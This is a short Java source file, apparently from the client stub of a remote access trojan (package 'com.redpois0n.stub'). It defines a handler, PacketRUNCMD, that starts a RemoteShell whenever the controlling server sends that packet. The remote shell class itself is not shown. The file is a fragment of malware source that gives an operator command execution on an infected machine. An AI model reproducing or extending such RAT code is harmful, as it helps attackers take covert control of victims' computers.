package com.redpois0n.stub.packets.incoming;

import com.redpois0n.RemoteShell;

public class PacketRUNCMD extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new RemoteShell().start();
	}

}
